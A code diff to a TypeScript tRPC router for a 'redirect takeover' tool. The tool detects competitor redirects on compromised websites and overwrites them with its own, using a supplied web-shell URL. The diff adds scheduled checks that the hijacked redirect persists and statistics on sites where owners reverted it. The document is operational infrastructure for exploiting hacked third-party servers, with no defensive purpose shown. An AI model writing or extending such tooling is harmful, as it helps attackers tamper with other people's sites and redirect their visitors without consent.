@@ -1,10 +1,17 @@
 /**
- * tRPC Router: Redirect Takeover
- * Detect and overwrite competitor redirects on compromised sites
+ * tRPC Router: Redirect Takeover + Verification
+ * Detect, overwrite competitor redirects, and verify takeover success
  */
 import { z } from "zod";
 import { protectedProcedure, router } from "../_core/trpc";
 import { detectExistingRedirects, executeRedirectTakeover } from "../redirect-takeover";
+import {
+  scheduleVerification,
+  triggerImmediateVerification,
+  getVerificationStats,
+  getSiteVerificationHistory,
+  processPendingVerifications,
+} from "../takeover-verifier";
 import { getDb } from "../db";
 import { hackedSiteDetections } from "../../drizzle/schema";
 import { desc, eq } from "drizzle-orm";
@@ -38,14 +45,13 @@ export const redirectTakeoverRouter = router({
           });
         }
       } catch (e) {
-        // Best-effort save — don't fail the scan
         console.error("[RedirectTakeover] Failed to save detection:", e);
       }
 
       return result;
     }),
 
-  /** Execute redirect takeover on a target */
+  /** Execute redirect takeover on a target — auto-schedules verification */
   execute: protectedProcedure
     .input(z.object({
       targetUrl: z.string().url(),
@@ -66,21 +72,38 @@ export const redirectTakeoverRouter = router({
         shellUrl: input.shellUrl,
       });
 
-      // Update database record
+      const anySuccess = results.some(r => r.success);
+      const successMethod = results.find(r => r.success);
+
+      // Update database record + schedule verification
+      let verificationScheduled = false;
       try {
         const db = await getDb();
         if (db) {
           const domain = new URL(input.targetUrl).hostname;
-          const anySuccess = results.some(r => r.success);
-          const successMethod = results.find(r => r.success);
           await db.update(hackedSiteDetections)
             .set({
               takeoverStatus: anySuccess ? "success" : "failed",
               takeoverMethod: successMethod?.method || results.map(r => r.method).join(", "),
               takeoverResult: JSON.stringify(results),
               takeoverAt: new Date(),
+              ourRedirectUrl: input.ourRedirectUrl,
             })
             .where(eq(hackedSiteDetections.domain, domain));
+
+          // Auto-schedule verification if takeover succeeded
+          if (anySuccess) {
+            const [site] = await db.select({ id: hackedSiteDetections.id })
+              .from(hackedSiteDetections)
+              .where(eq(hackedSiteDetections.domain, domain))
+              .orderBy(desc(hackedSiteDetections.id))
+              .limit(1);
+
+            if (site) {
+              await scheduleVerification(site.id, input.ourRedirectUrl);
+              verificationScheduled = true;
+            }
+          }
         }
       } catch (e) {
         console.error("[RedirectTakeover] Failed to update takeover status:", e);
@@ -88,9 +111,41 @@ export const redirectTakeoverRouter = router({
 
       return {
         results,
-        anySuccess: results.some(r => r.success),
+        anySuccess,
+        verificationScheduled,
       };
     }),
+
+  // ─── Verification Endpoints ───
+
+  /** Manually trigger immediate verification for a site */
+  verifyNow: protectedProcedure
+    .input(z.object({ siteId: z.number() }))
+    .mutation(async ({ input }) => {
+      const result = await triggerImmediateVerification(input.siteId);
+      return result;
+    }),
+
+  /** Get verification history for a specific site */
+  getVerificationHistory: protectedProcedure
+    .input(z.object({ siteId: z.number() }))
+    .query(async ({ input }) => {
+      return getSiteVerificationHistory(input.siteId);
+    }),
+
+  /** Get overall verification stats */
+  getVerificationStats: protectedProcedure
+    .query(async () => {
+      return getVerificationStats();
+    }),
+
+  /** Process all pending verifications (called by orchestrator or manually) */
+  processPendingVerifications: protectedProcedure
+    .mutation(async () => {
+      return processPendingVerifications();
+    }),
+
+  // ─── Existing Endpoints ───
 
   /** List all hacked site detections from database */
   listHackedSites: protectedProcedure
@@ -103,17 +158,23 @@ export const redirectTakeoverRouter = router({
         .limit(200);
     }),
 
-  /** Get stats for hacked sites */
+  /** Get stats for hacked sites (includes verification stats) */
   getStats: protectedProcedure
     .query(async () => {
       const db = await getDb();
-      if (!db) return { total: 0, hacked: 0, takenOver: 0, failed: 0 };
+      if (!db) return {
+        total: 0, hacked: 0, takenOver: 0, failed: 0,
+        pendingVerification: 0, verifiedSuccess: 0, verifiedReverted: 0,
+      };
       const all = await db.select().from(hackedSiteDetections);
       return {
         total: all.length,
         hacked: all.filter(s => s.isHacked).length,
         takenOver: all.filter(s => s.takeoverStatus === "success").length,
         failed: all.filter(s => s.takeoverStatus === "failed").length,
+        pendingVerification: all.filter(s => s.verificationStatus === "pending").length,
+        verifiedSuccess: all.filter(s => s.verificationStatus === "verified_success").length,
+        verifiedReverted: all.filter(s => s.verificationStatus === "verified_reverted").length,
       };
     }),
 
@@ -155,7 +216,6 @@ export const redirectTakeoverRouter = router({
             }
           } catch { /* best-effort */ }
 
-          // Small delay between scans
           await new Promise(r => setTimeout(r, 500));
         } catch (e: any) {
           results.push({ url, detected: false, competitorUrl: null, error: e.message });
